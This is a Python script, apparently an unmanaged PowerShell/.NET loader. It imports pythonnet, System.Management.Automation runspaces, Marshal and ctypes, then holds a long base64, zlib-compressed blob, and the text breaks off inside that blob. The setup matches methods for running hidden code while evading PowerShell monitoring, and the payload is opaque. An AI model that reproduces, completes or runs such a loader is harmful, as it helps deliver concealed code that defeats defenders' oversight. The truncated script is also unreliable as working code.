import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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